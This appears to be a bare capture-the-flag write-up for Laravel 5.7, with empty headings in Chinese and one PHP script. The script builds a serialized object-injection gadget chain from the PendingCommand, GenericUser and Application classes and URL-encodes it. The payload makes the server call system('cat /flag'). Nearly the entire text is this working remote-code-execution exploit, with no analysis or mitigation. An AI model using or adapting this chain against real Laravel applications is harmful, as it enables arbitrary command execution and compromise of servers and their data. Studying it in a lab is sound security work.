# 知识点
# 思路
Laravel v5.7
```plsql
<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;
        public function __construct($command, $parameters,$class,$app){
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}
namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}
namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;
        public function __construct($bind){
            $this->bindings=$bind;
        }
    }
}
namespace{
    $genericuser = new Illuminate\Auth\GenericUser(
        array(
            "expectedOutput"=>array("0"=>"1"),
            "expectedQuestions"=>array("0"=>"1")
             )
    );
    $application = new Illuminate\Foundation\Application(
        array(
            "Illuminate\Contracts\Console\Kernel"=>
                array(
                    "concrete"=>"Illuminate\Foundation\Application"
                     )
             )
    );
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
        "system",array('cat /flag'),
        $genericuser,
        $application
    );
    echo urlencode(serialize($pendingcommand));
}
?>
```
